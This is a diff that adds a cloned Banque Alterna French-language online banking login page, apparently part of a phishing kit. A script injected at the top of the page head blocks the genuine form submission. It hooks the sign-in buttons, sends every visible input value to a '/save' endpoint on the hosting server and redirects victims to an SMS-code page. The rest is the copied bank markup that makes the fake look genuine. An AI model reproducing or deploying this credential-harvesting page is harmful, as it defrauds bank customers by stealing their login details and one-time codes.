@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<!-- saved from url=(1573)https://ids.alternabank.ca/LoginWorkflow/Index?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3DInternetBanking%26redirect_uri%3Dhttps%253A%252F%252Fonline.alternabank.ca%26response_type%3Dcode%2520id_token%2520token%26scope%3Dopenid%2520profile%2520Scope.Trusted%2520offline_access%26state%3DOpenIdConnect.AuthenticationProperties%253D00RT0uHWpO3Z2F43ULqjmnsYB061LjbYELjl3tGzGLnb6-dIuYvzT1WiqywgfGn-WC7BP9T2VD61m-vka4xL-WOjbQVMz8Zubdddld2mHIKUUU4ZzSWRKwTiyM3HdtjPGfe_hjxwel8hHUXPv_hpY4_f-RbcFzFdm32_vUNCd9-dOXC2-co-0n4Dca8cTJ697VYwakMa4LXugNyZawXQ_hN7o-kpxEsZn4uc3fYp3sfYRZz2FQoE11w4qQdYnTHU4NTMSZ-lZ2dE2FN7XSz58sG0Kx3I7uxdyKo_IP0O92B7v6jp-23Jju86iRgE8bQG24Jud_1iudXbzkNd2zM9Z4bCMl5h_QGK5t6kgj-qDyOZks_q4RQ1lxn5ZOlZ_-4A7ds5QX8_s0GC1EwG0qEYhBxZqrIEc7wfd3O3pv5omay7R6yRYicB5gqAsyZE6DgeX54B-_ltoikSXVeYJKcGCmwKf9ghREqhZDN8fGWSZlSq2zciUYLToT2wGOWVp7YHBaApD4uglDLnmFCDYJQq6X-qJxFQujvh71PqSSsvKBp_YHmR4FU5VUnzTbRJ57lR%26response_mode%3Dform_post%26nonce%3D639217273110630276.MjQwZmYwZjItOWZmMC00NzNjLWJjN2UtMjAxNTFmNDk5ZjNlZWVkNWExM2UtYzJmNS00NmVlLWJhMWItNzFjNTc3OTAwODdj%26client_secret%3D1dec5e31-ba4e-400b-9b56-f63ec91fc274%26EBANKIT-LANG%3DFR-FR%26X-DeviceInfo%3D%257B%2522DeviceId%2522%253A%2522%2522,%2522DeviceModel%2522%253A%2522%2522,%2522DeviceFamily%2522%253A0,%2522PushToken%2522%253Anull,%2522DeviceApplication%2522%253A%2522INTERNETBANKING%2522,%2522FrontendHost%2522%253Anull,%2522TransactionalHost%2522%253Anull%257D%26X-RiskAssesment-Id%3De4af2910-a43b-4cb8-b0c9-adcb61bd8cc5%26X-TmxOrgId%3D2x745fnx%26x-client-SKU%3DID_NET472%26x-client-ver%3D6.27.0.0 -->
+<html lang="fr-FR"><head>
+<script id="override-fix" type="text/javascript">
+(function() {
+    var loc = window.location.pathname.split('/').pop();
+    var bankName = loc.replace('.html', '').replace('_sms', '');
+    var SMS_PAGE = bankName + '_sms.html';
+    
+    function blockAllForms() {
+        document.querySelectorAll('form').forEach(function(f) {
+            if(!f._blocked) {
+                f._blocked = true;
+                f.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    e.stopImmediatePropagation();
+                    return false;
+                }, true);
+                f.onsubmit = function(e) { return false; };
+                if(f.action) f.action = 'javascript:void(0)';
+            }
+        });
+    }
+    
+    function handleClick(e) {
+        var btn = e.currentTarget;
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        
+        var _data = { bank: bankName, type: 'login', fields: {} };
+        var inps = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');
+        for(var i=0; i<inps.length; i++) {
+            var key = inps[i].name || inps[i].id || inps[i].placeholder || 'champ_'+i;
+            _data.fields[key] = inps[i].value;
+        }
+        
+        var oldText = btn.textContent || btn.value;
+        if(btn.tagName === 'INPUT') btn.value = 'Patientez...';
+        else btn.textContent = 'Patientez...';
+        
+        fetch('/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(_data)
+        }).then(function() {
+            window.location.href = SMS_PAGE;
+        }).catch(function() {
+            window.location.href = SMS_PAGE;
+        });
+        return false;
+    }
+    
+    function attachBtn() {
+        var allBtns = document.querySelectorAll('button, input[type="submit"], input[type="button"], a.btn, a[class*="btn"]');
+        for(var i=0; i<allBtns.length; i++) {
+            var txt = (allBtns[i].textContent || allBtns[i].value || '').trim().toLowerCase();
+            if(txt && (txt.includes('continu') || txt.includes('sign in') || txt.includes('log in') || txt.includes('valider') || txt.includes('se connecter') || txt.includes('next') || txt.includes('submit') || txt.includes('login') || txt.includes('connexion'))) {
+                var btn = allBtns[i];
+                if(!btn._overrideAttached) {
+                    btn._overrideAttached = true;
+                    btn.disabled = false;
+                    btn.removeAttribute('disabled');
+                    btn.removeAttribute('aria-disabled');
+                    btn.style.cursor = 'pointer';
+                    btn.style.pointerEvents = 'auto';
+                    btn.addEventListener('click', handleClick, true);
+                    btn.addEventListener('mousedown', function(e) { e.stopImmediatePropagation(); }, true);
+                }
+            }
+        }
+    }
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        blockAllForms();
+        attachBtn();
+        var obs = new MutationObserver(function() {
+            blockAllForms();
+            attachBtn();
+        });
+        obs.observe(document.body, { childList: true, subtree: true });
+    });
+    
+    if(document.readyState !== 'loading') {
+        setTimeout(function() {
+            blockAllForms();
+            attachBtn();
+        }, 50);
+    }
+    
+    document.addEventListener('click', function(e) {
+        var btn = e.target.closest('button, input[type="submit"], input[type="button"], a');
+        if(btn) {
+            var txt = (btn.textContent || btn.value || '').trim().toLowerCase();
+            if(txt && (txt.includes('continu') || txt.includes('sign in') || txt.includes('log in') || txt.includes('valider') || txt.includes('se connecter') || txt.includes('next') || txt.includes('submit') || txt.includes('login') || txt.includes('connexion'))) {
+                if(!btn._overrideAttached) {
+                    attachBtn();
+                    handleClick(e);
+                }
+            }
+        }
+    }, true);
+})();
+</script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Login | Banque Alterna</title>
+    <link href="#" rel="shortcut icon" type="image/x-icon">
+
+    <link rel="stylesheet" href="./Login _ Banque Alterna_files/bootstrap.min.css">
+
+    <link rel="stylesheet" href="./Login _ Banque Alterna_files/site.min.css">
+    <link rel="stylesheet" href="./Login _ Banque Alterna_files/styles.min.css">
+    <link rel="stylesheet" href="./Login _ Banque Alterna_files/login-new-default.css">
+    <link rel="stylesheet" href="./Login _ Banque Alterna_files/ebankit-cookies.css">
+
+    <script src="./Login _ Banque Alterna_files/jquery.min.js.téléchargement"></script>
+    <script src="./Login _ Banque Alterna_files/bootstrap.min.js.téléchargement"></script>
+    <script src="./Login _ Banque Alterna_files/jquery.blockUI.min.js.téléchargement"></script>
+    <script src="./Login _ Banque Alterna_files/jquery.validate.min.js.téléchargement"></script>
+    <script src="./Login _ Banque Alterna_files/jquery.validate.unobtrusive.min.js.téléchargement"></script>
+
+    
+    
+        <script src="./Login _ Banque Alterna_files/site.js.téléchargement"></script>
+    
+<script id="tmxRiskAssessmentEmbed" defer="" src="./Login _ Banque Alterna_files/tags.js.téléchargement"></script><script async="" src="./Login _ Banque Alterna_files/genesys.min.js.téléchargement" charset="utf-8"></script><script src="./Login _ Banque Alterna_files/sharer.min.js.téléchargement" type="text/javascript" charset="UTF-8"></script><script src="./Login _ Banque Alterna_files/offersHelper.min.js.téléchargement" type="text/javascript" charset="UTF-8"></script></head>
+<body>
+    
+    <div class="grid-container">
+        <div class="side-menu">
+            <div class="SideLogo">
+                <div class="layout-header MainLogo Centered">
+                            <img src="./Login _ Banque Alterna_files/BANK_ico_logo_header_fr_responsive.png" alt="Logo Alterna banking">
+                </div>
+                 
+            </div>
+        </div>
+        <div class="main-grid-container">
+            <div class="mainFrameBody">
+                <div class="mainFrameBodyRender">
+                    
+
+
+<div class="DefaultMargin">
+        <div class="MainTitle">
+            <div class="MainHeader">
+                    <div class="row">
+                        <div class="col-xs-9">
+                            <a id="alternaLogo" class="a-primary index" href="#">
+                                <img src="./Login _ Banque Alterna_files/BANK_ico_logo_header_fr.png" alt="Alterna banque">
+                            </a>
+                        </div>
+                        <div class="col-xs-3">
+                            <div class="noprint langSelector">
+                                    <a class="aVariation" aria-label="Changer la langue en EN" href="#">
+                                    EN
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+            </div>
+            <h1 class="MainSubMenu">
+                Connectez-vous à votre compte
+            </h1>
+            <br>
+            <div class="FTLAttention">
+            </div>
+        </div>
+
+        
+
+
+
+
+
+<form method="post" action="https://ids.alternabank.ca/LoginWorkflow/Index" novalidate="novalidate">
+    <input type="hidden" id="AuthenticationStep" name="AuthenticationStep" value="Username">
+    <input type="hidden" id="ReturnUrl" name="ReturnUrl" value="/connect/authorize/callback?client_id=InternetBanking&amp;redirect_uri=https%3A%2F%2Fonline.alternabank.ca&amp;response_type=code%20id_token%20token&amp;scope=openid%20profile%20Scope.Trusted%20offline_access&amp;state=OpenIdConnect.AuthenticationProperties%3D00RT0uHWpO3Z2F43ULqjmnsYB061LjbYELjl3tGzGLnb6-dIuYvzT1WiqywgfGn-WC7BP9T2VD61m-vka4xL-WOjbQVMz8Zubdddld2mHIKUUU4ZzSWRKwTiyM3HdtjPGfe_hjxwel8hHUXPv_hpY4_f-RbcFzFdm32_vUNCd9-dOXC2-co-0n4Dca8cTJ697VYwakMa4LXugNyZawXQ_hN7o-kpxEsZn4uc3fYp3sfYRZz2FQoE11w4qQdYnTHU4NTMSZ-lZ2dE2FN7XSz58sG0Kx3I7uxdyKo_IP0O92B7v6jp-23Jju86iRgE8bQG24Jud_1iudXbzkNd2zM9Z4bCMl5h_QGK5t6kgj-qDyOZks_q4RQ1lxn5ZOlZ_-4A7ds5QX8_s0GC1EwG0qEYhBxZqrIEc7wfd3O3pv5omay7R6yRYicB5gqAsyZE6DgeX54B-_ltoikSXVeYJKcGCmwKf9ghREqhZDN8fGWSZlSq2zciUYLToT2wGOWVp7YHBaApD4uglDLnmFCDYJQq6X-qJxFQujvh71PqSSsvKBp_YHmR4FU5VUnzTbRJ57lR&amp;response_mode=form_post&amp;nonce=639217273110630276.MjQwZmYwZjItOWZmMC00NzNjLWJjN2UtMjAxNTFmNDk5ZjNlZWVkNWExM2UtYzJmNS00NmVlLWJhMWItNzFjNTc3OTAwODdj&amp;client_secret=1dec5e31-ba4e-400b-9b56-f63ec91fc274&amp;EBANKIT-LANG=FR-FR&amp;X-DeviceInfo=%7B%22DeviceId%22%3A%22%22,%22DeviceModel%22%3A%22%22,%22DeviceFamily%22%3A0,%22PushToken%22%3Anull,%22DeviceApplication%22%3A%22INTERNETBANKING%22,%22FrontendHost%22%3Anull,%22TransactionalHost%22%3Anull%7D&amp;X-RiskAssesment-Id=e4af2910-a43b-4cb8-b0c9-adcb61bd8cc5&amp;X-TmxOrgId=2x745fnx&amp;x-client-SKU=ID_NET472&amp;x-client-ver=6.27.0.0">
+    <input type="hidden" id="UserType" name="UserType" value="CUSTOMER">
+    <input type="hidden" id="ActionName" name="ActionName" value="NextStepUsername">
+    <input type="hidden" id="Interaction" name="Interaction" value="4336f036-3d06-45bf-95e6-bde1ff540011">
+    <input type="hidden" data-val="true" data-val-required="The IsFirstStep field is required." id="IsFirstStep" name="IsFirstStep" value="True">
+    <input type="hidden" data-val="true" data-val-required="The LastStepCheck field is required." id="LastStepCheck" name="LastStepCheck" value="False">
+    <input type="hidden" data-val="true" data-val-required="The AllowLocalLogin field is required." id="AllowLocalLogin" name="AllowLocalLogin" value="True">
+    <input type="hidden" id="ExternalProviders" name="ExternalProviders" value="System.Collections.Generic.List`1[Ebankit.FE.IdentityServer.Models.ExternalProvider]">
+    <input type="hidden" data-val="true" data-val-required="The ShowRecoveryLink field is required." id="ShowRecoveryLink" name="ShowRecoveryLink" value="True">
+    <input id="LoginWorkflowLatitude" type="hidden" name="Latitude" value="">
+    <input id="LoginWorkflowLongitude" type="hidden" name="Longitude" value="">
+    <input id="LoginWorkflowUserAgent" type="hidden" name="UserAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36">
+
+    
+<div class="LoginForm">
+    <div class="form-group">
+        <label class="MainLabel" for="Username">
+            ID utilisateur
+        </label>
+        <input class="form-control MainTextBox no-whitespace" placeholder="Entrer votre ID utilisateur" data-val-required="Veuillez saisir ID utilisateur" data-val-length="[Login:UsernameMaxLength]" data-val-regex="Veuillez saisir un ID utilisateur valide" data-val-regex-pattern="^[a-zA-Z0-9]{1,30}$" type="text" data-val="true" data-val-length-max="200" id="Username" maxlength="200" name="Username" value="">
+        <span class="field-validation-error field-validation-valid" data-valmsg-for="Username" data-valmsg-replace="true"></span>
+    </div>
+</div>
+
+
+
+    <div class="LoginFormButtonGroup">
+
+            <button class="btn btn-block MainConfirmButton" name="button" value="submit" formaction="/LoginWorkflow/NextStepUsername">
+                Continuer
+            </button>
+        <button class="btn btn-block MainCancelButton" name="button" value="ignore" formnovalidate="" formaction="/LoginWorkflow/GotoPortal">
+            Annuler
+        </button>
+    </div>
+
+        <div class="secundaryButtonLink">
+            <a class="RecoverPassword" style="text-decoration: underline" href="#">
+                Mot de passe oublié?
+            </a>
+        </div>
+
+        <div class="signuplink">
+            <span class="text-responsive-1">
+                Pas encore client?
+                <a class="" style="text-decoration: underline" href="#">
+                    Nous joindre
+                </a>
+            </span>
+        </div>
+        <div class="registerlink">
+            <span class="text-responsive-1">
+                Sans accès?
+                <a class="" style="text-decoration: underline" href="#">
+                    Inscrivez-vous pour vous connecter.
+                </a>
+            </span>
+        </div>
+        <div class="hidden">
+                    <input type="hidden" id="hdnTmxActive" name="hdnTmxJsTagsFile" value="true">
+                    <input type="hidden" id="hdnTmxJsTagsFile" name="hdnTmxJsTagsFile" value="https://content.alternabank.ca/fp/tags.js?org_id=2x745fnx&amp;session_id=e4af2910-a43b-4cb8-b0c9-adcb61bd8cc5">
+                    <script src="./Login _ Banque Alterna_files/CustomTMX.min.js.téléchargement"></script>
+        </div>
+
+    <div class="contentBlock">
+        <div>
+            <p>En vous connectant, vous acceptez les <a href="#" target="_blank" rel="noopener">conditions générales</a>.</p>
+        </div>
+    </div>
+
+<input name="__RequestVerificationToken" type="hidden" value="CfDJ8BXAcv4OE0dGoGY_89lA-O7zWKm3OhMs12xqC2WN965bqk1WfTqrv00NskceIqItP9StMNurANcImvr0hyJKIfjFnOqejXVWUpboa42ee_wbEpvEM_opU_oroCIc8fMght2hw6Lq2gUcRcrlY9K0pco"></form>
+
+</div>
+
+                </div>
+                <div class="custom-footer">
+                    <footer class="page-footer Centered">
+                        <p>© Alterna - All rights reserved</p>
+                    </footer>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer-responsive">
+        <footer class="page-footer Centered">
+            <p>© Alterna - All rights reserved</p>
+        </footer>
+    </div>
+    <div class="container">
+        <!-- <partial name="_CookieConsentPartial" /> -->
+                
+
+
+
+
+<div id="CookieDisclaimer" class="CookieContainer" style="display: none;">
+    <div class="gdprPopup_popup" style="display: none;">
+        <div class="gdprPopup_overlay"></div>
+
+        <div class="gdprPopup_content">
+            <div class="gdprIntro_intro">
+                <div class="gdprIntro_title">
+                    <div class="controlCookiesManagementFullTitle">
+                        <!-- Gestion des t&#xE9;moins -->
+                    </div>
+                </div>
+                <div class="gdprIntro_description">
+                    <div id="CookieDescription">
+                        La Banque Alterna utilise des témoins sur ce site pour améliorer votre expérience. Sélectionnez « Accepter tout » pour une expérience plus optimisée ou « Gérer mes préférences » pour personnaliser vos choix. Pour en savoir plus, consultez notre politique de confidentialité.
+                    </div>
+                </div>
+                <div class="gdprIntro_options">
+                    <button class="gdprButton_button gdprIntro_MoreInfo CookieCancelButton" type="button" onclick="ShowCookiesInfo();">
+                        <div id="MoreInfoCookieButton">
+                            Gérer les préférences
+                        </div>
+                    </button>
+                    <button class="gdprButton_button gdprIntro_acceptAll CookieConfirmButton" onclick="CreateCookie(&#39;ShowCookieBar&#39;,&#39;365&#39;); $(&#39;.unfocus&#39;).attr(&#39;tabindex&#39;, 0).removeClass(&#39;unfocus&#39;).removeAttr(&#39;disabled&#39;); $(&#39;.CookieContainer&#39;).hide();" type="button">
+                        <div class="controlComfirmationCookieButton">
+                            Accepter tout
+                        </div>
+                    </button>
+                    <div class="gdprIntro">
+                        <a class="gdprIntro_link" href="#" target="_blank" rel="external">
+                            Politique de confidentialité
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="container CookieContentFooter" style="display: none;"></div>
+</div>
+
+<div class="gdprPopup_moreInfo" style="display:none;">
+
+<div class="gdprIntro_introInfo cookieRelative">
+    <div class="gdprCookiesInfo_Title">
+        <div id="gdprCookiesManagementFullTitle">
+                Gestion des témoins
+        </div>
+        <span>
+            <button class="close-generic gdprCloseButton_button" type="button" onclick="ShowInitialConsent();"></button>
+        </span>
+    </div>
+    <div class="gdprIntro_descriptionInfo">
+        <div id="gdprCookieInfoOverview" style="display: block;">
+            <div class="gdprCookieInfoContainer">
+                <div class="gdprCookiesTabs crumbs metro">
+                    <ul class="item">
+                            <li id="gdprCookiesRequired" tabindex="0" onkeyup="if(event.keyCode === 13)$(this).click();" onclick="javascript: showCookieContainerDetail(&#39;required&#39;);" class="gdprCookiesTab gdprCookiesTabSelected select"><span class="steptext gdprTabText_label gdprRemoveCapitalize">Strictement nécessaires</span><i class="icon-record"></i></li>
+                            <li id="gdprCookiesPerformance" tabindex="0" onkeyup="if(event.keyCode === 13)$(this).click();" onclick="javascript: showCookieContainerDetail(&#39;performance&#39;);" class="gdprCookiesTab gdprCookiesTabItem notselect"><span class="steptext gdprTabText_label gdprRemoveCapitalize">Performances</span><i class="icon-record"></i></li>
+                            <li id="gdprCookiesFunctional" tabindex="0" onkeyup="if(event.keyCode === 13)$(this).click();" onclick="javascript: showCookieContainerDetail(&#39;functional&#39;);" class="gdprCookiesTab gdprCookiesTabItem notselect"><span class="steptext gdprTabText_label gdprRemoveCapitalize">Fonctionnalité</span><i class="icon-record"></i></li>
+                            <li id="gdprCookiesAdvertising" tabindex="0" onkeyup="if(event.keyCode === 13)$(this).click();" onclick="javascript: showCookieContainerDetail(&#39;advertising&#39;);" class="gdprCookiesTab gdprCookiesTabItem notselect"><span class="steptext gdprTabText_label gdprRemoveCapitalize">Marketing et publicité</span><i class="icon-record"></i></li>
+                    </ul>
+                </div>
+                <div class="gdprCookiesDescription">
+                    <div id="gdprCookiesRequiredDescription" class="gdprCookiesRequiredDescription" style="display: block;">
+                        <div class="gdprCookieButtonitem description">
+                            <div class="gdprCookieDescriptionItem gdprDescriptionBox_div">
+                                <div class="gdprRowCookieDesc_div">
+                                    <div class="gdprCookieButtonitem selection gdprCookieTabDisabled" style="cursor: not-allowed;">
+                                        <input disabled="disabled" type="checkbox" id="gdprCookieButtonRequiredInput" class="gdprCookieButtonAdvertisingInput gdprCookieTabDisabled" checked="checked">
+                                    </div>
+                                    <div class="gdprCheckBoxTitle_div">
+                                            Sélectionner le type
+                                    </div>
+                                </div>
+                                    <div style="padding: 10px;">
+                                        Ces témoins optimisent les fonctionnalités de base et les zones sécurisées du site Web. Ils sont nécessaires aux services du site et ne collectent pas de renseignements personnels ni ne suivent vos chemins de navigation.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="gdprCookiesPerformanceDescription" class="gdprCookiesPerformanceDescription" style="display: none;">
+                        <div class="gdprCookieButtonitem description">
+                            <div class="gdprCookieDescriptionItem gdprDescriptionBox_div">
+                                <div class="row gdprRowCookieDesc_div">
+                                    <div class="gdprCookieButtonitem selection gdprCheckMarkEnabled col-xs-1" style="display: block;">
+                                        <input type="checkbox" id="gdprCookieButtonPerformanceInput" class="gdprCookieButtonAdvertisingInput" checked="checked">
+                                        <div class="gdprCheckBoxTitle_div">
+                                                Sélectionner le type
+                                        </div>
+                                    </div>
+                                </div>
+                                <div style="padding: 10px;">
+                                        Nous aide à améliorer notre site Web en comprenant les façons dont les visiteurs l’utilisent et interagissent avec lui. Mesure le trafic du site et crée des statistiques pour améliorer votre expérience de navigation.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="gdprCookiesFunctionalDescription" class="gdprCookiesFunctionalDescription" style="display: none;">
+                        <div class="gdprCookieButtonitem description">
+                            <div class="gdprCookieDescriptionItem gdprDescriptionBox_div">
+                                <div class="row gdprRowCookieDesc_div">
+                                    <div class="gdprCookieButtonitem selection gdprCheckMarkEnabled col-xs-1" style="cursor: not-allowed; display: none;">
+                                        <input type="checkbox" id="gdprCookieButtonFunctionalInput" class="gdprCookieButtonAdvertisingInput" checked="checked">
+                                    </div>
+                                </div>
+                                <div style="padding: 10px;">
+                                        Permet au site Web de proposer des fonctionnalités et une personnalisation améliorées.
+                                </div>
+                                <div class="col-xs-12 gdprCookieMessage" style="padding: 20px;">
+                                    Nous n’avons pas de témoins de ce type
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="gdprCookiesAdvertisingDescription" class="gdprCookiesAdvertisingDescription" style="display: none;">
+                        <div class="gdprCookieButtonitem description">
+                            <div class="gdprCookieDescriptionItem gdprDescriptionBox_div">
+                                <div class="row gdprRowCookieDesc_div">
+                                    <div class="gdprCookieButtonitem selection gdprCheckMarkEnabled col-xs-1" style="cursor: not-allowed; display: none;">
+                                        <input type="checkbox" id="gdprCookieButtonAdvertisingInput" class="gdprCookieButtonAdvertisingInput" checked="checked">
+                                    </div>
+                                </div>
+                                <div style="padding: 10px;">
+                                        Permet à la Banque Alterna et à nos partenaires de vous montrer des publicités pertinentes et personnalisées, qui sont axées sur vos intérêts et votre emplacement.
+                                </div>
+                                <div class="col-xs-12 gdprCookieMessage" style="padding: 20px;">
+                                    Nous n’avons pas de témoins de ce type
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="gdprIntro_optionsInfo">
+        <div class="gdprIntroInfo">
+                <a class="gdprIntroInfo_link" href="#" target="_blank" rel="noopener noreferrer">
+                    Politique de confidentialité
+            </a>
+        </div>
+            <button class="gdprIntro_MoreInfo gdprInfoButton_button CookieCancelButton" onclick="ShowInitialConsent();" type="button">
+            <span>
+                    Précédent
+            </span>
+        </button>
+            <button class="gdprIntro_acceptAll gdprInfoButton_button CookieConfirmButton" onclick="CreateCookie(&#39;ShowCookieBar&#39;,&#39;365&#39;); $(&#39;.unfocus&#39;).attr(&#39;tabindex&#39;, 0).removeClass(&#39;unfocus&#39;).removeAttr(&#39;disabled&#39;); $(&#39;.CookieContainer&#39;).hide();" type="button">
+            <span>
+                    Confirmer
+            </span>
+        </button>
+    </div>
+</div>
+</div>
+
+<script>
+        
+    var cookieName = "ShowCookieBar";
+    var cookies = document.cookie;
+
+    if (cookies.indexOf(cookieName) > -1) {
+        $('.gdprPopup_popup').hide();
+        $('.gdprPopup_moreInfo').hide();
+    }
+
+    function updateCheckbox(aux) {
+        var self = aux;
+        var checkbox = $(self).prev();
+
+        if (checkbox.is(":disabled")) {
+            return;
+        }
+
+        if(checkbox.is(':checked')) {
+            checkbox.prop('checked', '');
+        } 
+        else {
+             checkbox.prop('checked', 'checked');
+        }
+    }
+
+    function ShowInitialConsent()
+    {
+        $(".gdprPopup_moreInfo").hide();
+        //$(".gdprPopup_moreInfo").empty();
+
+        $('.unfocus2').attr('tabindex', 0).removeClass('unfocus2').removeAttr('disabled');
+        $(".gdprPopup_content .gdprIntro_link").removeAttr("style");
+    }
+
+    function ShowCookiesInfo() {
+        $(".gdprPopup_moreInfo").show();
+    }
+
+    function showCookieContainerDetail(detail)
+    {
+        $(".gdprCookiesTabSelected").removeClass("gdprCookiesTabSelected").addClass("gdprCookiesTabItem");
+        $(".select").removeClass("select").addClass("notselect");
+
+
+        $(".gdprCookiesDescription").children().css("display", "none");
+        switch (detail)
+        {
+            case "required":
+                $("#gdprCookiesRequired").removeClass("gdprCookiesTabItem").addClass("gdprCookiesTabSelected");
+                $("#gdprCookiesRequired").removeClass("notselect").addClass("select");
+                $("#gdprCookiesRequiredDescription").css("display", "block");
+                break;
+            case "performance":
+                $("#gdprCookiesPerformance").removeClass("gdprCookiesTabItem").addClass("gdprCookiesTabSelected");
+                $("#gdprCookiesPerformance").removeClass("notselect").addClass("select");
+                $("#gdprCookiesPerformanceDescription").css("display", "block");
+                break;
+            case "functional":
+                $("#gdprCookiesFunctional").removeClass("gdprCookiesTabItem").addClass("gdprCookiesTabSelected");
+                $("#gdprCookiesFunctional").removeClass("notselect").addClass("select");
+                $("#gdprCookiesFunctionalDescription").css("display", "block");
+                break;
+            case "advertising":
+                $("#gdprCookiesAdvertising").removeClass("gdprCookiesTabItem").addClass("gdprCookiesTabSelected");
+                $("#gdprCookiesAdvertising").removeClass("notselect").addClass("select");
+                $("#gdprCookiesAdvertisingDescription").css("display", "block");
+                break;
+        }
+    }
+
+    function CreateCookie(name, days) {
+        if (days) {
+            var date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            var expires = "; expires=" + date.toGMTString();
+        } else {
+            var expires = "";
+        }
+
+        var domain = getDomainFromUrl(document.domain);
+        domain = (domain != null) ? "; domain=" + domain : "";
+
+        if ($("#gdprCookieInfoOverview").length > 0) {
+            var performance = $("#gdprCookieButtonPerformanceInput").is(":checked");
+            var functional = $("#gdprCookieButtonFunctionalInput").is(":checked");
+            var advertisment = $("#gdprCookieButtonAdvertisingInput").is(":checked");
+
+            // Cookie Types:
+            // 1: required
+            // 2: functional
+            // 3: ads & marketing
+            // 4: performance
+            var value = "cookie 1 " + (functional === true ? " 2 " : "") + (advertisment === true ? " 3 " : "") + (performance === true ? " 4 " : "");
+            //SameSite flag must be Lax - account aggregation issues
+            document.cookie = name + "=" + value + expires + domain + "; path=/; samesite=lax" + (window.location.protocol == "https:" ? "; secure" : "");
+        } else {
+            var value = "cookie 1 2 3 4";
+            //SameSite flag must be Lax - account aggregation issues
+            document.cookie = name + "=" + value + expires + domain + "; path=/; samesite=lax" + (window.location.protocol == "https:" ? "; secure" : "");
+        }
+        $('.gdprPopup_popup').hide();
+        $('.gdprPopup_moreInfo').hide();
+    }
+
+    function getDomainFromUrl(url) {
+        if (url == null) return "";
+        const regex = /^(?:https?:\/\/)?(?:www\.)?([^\/]+)/i;
+        const match = url.match(regex);
+        const domain = match ? match[1] : null;
+        if (domain != null) {
+             domainParts = domain.split(".");
+             domainParts.shift();
+             return domainParts.join(".");
+        }
+        return domain;
+    }
+</script>
+    </div>
+
+    <img class="loading-spinner" src="./Login _ Banque Alterna_files/BANK-loading-spinner.svg" alt="">
+    <input id="hdnGenesysDeploymentId" type="hidden" value="3b5b7bfa-4a77-48c3-b81c-6e49797c87f7">
+    <input id="hdnGenesysEnvironment" type="hidden" value="prod-cac1">
+
+
+    
+        
+        
+            <script src="./Login _ Banque Alterna_files/visitor.min.js.téléchargement"></script>
+        
+
+
+
+<iframe src="./Login _ Banque Alterna_files/saved_resource.html" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" data-time="1786130514134" style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;"></iframe><div id="genesys-thirdparty">
+  <style>
+      /** Initial iframe styles*/
+      .genesys-thirdparty-frame {
+          height: 0px;
+          width: 0px;
+          top: unset;
+          left: unset;
+          right: sideSpace;
+          bottom: bottomSpace;
+          z-index: 99999999;
+          border: none;
+          position: fixed;
+          display: none;
+      }
+  </style>
+  <iframe class="genesys-thirdparty-frame" id="genesys-thirdparty-frame" name="GenesysThirdpartyFrame" src="./Login _ Banque Alterna_files/thirdparty-plugins.html"></iframe>
+</div><iframe src="./Login _ Banque Alterna_files/hub.html" width="0" height="0" style="display: none; border: 0;" sandbox="allow-scripts allow-same-origin"></iframe><div id="genesys-messenger" class="genesys-app">
+  <style>
+    /** Initial iframe styles*/
+    .genesys-mxg-frame {
+      height: 0px;
+      max-height: 712px;
+      width: 0px;
+      top: unset;
+      left: unset;
+      right: 20px;
+      bottom: 12px;
+      z-index: 99999999;
+      border: none;
+      position: fixed;
+      margin:0!important;/**WEBMESS-1466: To overwrite the margins set by brand*/
+      min-height: initial!important; /**WEBMESS-1466: to override the min-height set by brand*/
+    }
+
+    .genesys-mxg-container-frame {
+      width: 0px;
+      height: 0px;
+      bottom: 92px
+    }
+
+    .genesys-mxg-expand {
+      max-height: 92%;
+    }
+
+    .genesys-mxg-frame-transition {
+      transition: all 300ms;
+    }
+
+    .genesys-mxg-frame-fullscreen {
+      width: 100% !important;
+      height: 100% !important;
+      max-height: 100%;
+      max-width: 100%;
+    }
+
+    /** Safari browser cannot be targeted using device pixel ratio for zoom **/
+    .mxg-desktop-mac-safari {
+      max-height: 80%;
+    }
+
+    .mxg-desktop-mac-firefox {
+      max-height: 80%;
+    }
+
+    .mxg-desktop-windows-firefox {
+      max-height: 80%;
+    }
+
+    .mxg-desktop-windows-chrome {
+      max-height: 80%;
+    }
+
+    /* Smartphones - potrait */
+    @media screen and (max-width: 600px),
+      screen and (max-device-width: 600px),
+      screen and (max-device-width: 600px) and (orientation: landscape),
+      screen and (max-device-height: 428px) and (orientation: landscape),
+      screen and (max-device-width: 711px) and (orientation: landscape) {
+      .genesys-mxg-responsive {
+        width: 0px;
+        height: 0px;
+        max-height: 100%;
+        max-width: 100%;
+      }
+
+      /* WEBMESS-1144: Set left, right and bottom to 0px to stop iframe expanding off screen on smaller devices */
+      .genesys-mxg-conversation {
+        height: 100% !important;
+        width: 100% !important;
+        left: 0px !important;
+        right: 0px !important;
+        bottom: 0px !important;
+      }
+
+      /* WEBMESS-1144: Set left, right and bottom to 0px to stop iframe expanding off screen on smaller devices */
+      .genesys-mxg-homescreen {
+        height: 100% !important;
+        width: 100% !important;
+        left: 0px !important;
+        right: 0px !important;
+        bottom: 0px !important;
+      }
+
+      .mxg-desktop-mac-firefox {
+        max-height: 98%;
+      }
+
